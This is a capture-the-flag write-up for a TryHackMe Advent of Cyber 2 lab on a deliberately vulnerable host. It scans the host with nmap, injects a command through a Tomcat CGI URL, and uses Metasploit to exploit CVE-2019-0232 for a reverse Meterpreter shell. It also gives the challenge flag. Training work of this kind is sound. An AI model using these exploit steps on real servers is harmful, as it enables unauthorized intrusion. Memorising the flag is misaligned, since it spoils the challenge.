# TRYHACKME: ADVENTOFCYBER2 [DAY 12] NETWORKING - Ready, set, elf

```
Christmas is fast approaching, yet, all remain silent at The Best Festival Company (TBFC). What gives?! The cheek of those elves - slacking at the festive period! Santa has no time for slackers in his workshop. After all, the sleigh won't fill itself, nor will the good and naughty lists be sorted. Santa has tasked you, Elf McEager, with whacking those elves back in line.
```

TOPICS: CVE, Metasploit

### QUESTIONS

What is the version number of the web server?

```
$ nmap -A -Pn 10.10.144.158
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 17:41 EST
Nmap scan report for 10.10.144.158
Host is up (0.12s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TBFC-WEB-01
|   NetBIOS_Domain_Name: TBFC-WEB-01
|   NetBIOS_Computer_Name: TBFC-WEB-01
|   DNS_Domain_Name: tbfc-web-01
|   DNS_Computer_Name: tbfc-web-01
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-19T22:42:15+00:00
| ssl-cert: Subject: commonName=tbfc-web-01
| Not valid before: 2020-12-11T21:55:21
|_Not valid after:  2021-06-12T21:55:21
|_ssl-date: 2020-12-19T22:42:16+00:00; 0s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http          Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.15 seconds
```

```
Apache Tomcat 9.0.17 running on port 8080
```

```
http://10.10.144.158:8080/cgi-bin/elfwhacker.bat?&systeminfo
```

What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

```
https://www.trendmicro.com/en_ca/research/19/d/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat.html
```

Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

```
$ sudo service postgresql start
$ sudo msfdb init
$ msfconsole

msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

msf6 > search cve:2019-0232

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability   


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/tomcat_cgi_cmdlineargs              

msf6 > use exploit/windows/http/tomcat_cgi_cmdlineargs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set LHOST 10.6.44.43
LHOST => 10.6.44.43
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set RHOST 10.10.144.158
RHOST => 10.10.144.158
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set TARGETURI /cgi-bin/elfwhacker.bat
TARGETURI => /cgi-bin/elfwhacker.bat
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > run 

```

What are the contents of flag1.txt

```
meterpreter > shell
Process 504 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4277-4242

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin

19/12/2020  23:15    <DIR>          .
19/12/2020  23:15    <DIR>          ..
19/11/2020  21:39               825 elfwhacker.bat
19/11/2020  22:06                27 flag1.txt
19/12/2020  23:15            73,802 QzlOd.exe
               3 File(s)         74,654 bytes
               2 Dir(s)   6,516,613,120 bytes free

C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>type flag1.txt
type flag1.txt
thm{whacking_all_the_elves}
C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>
```

Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

```
```
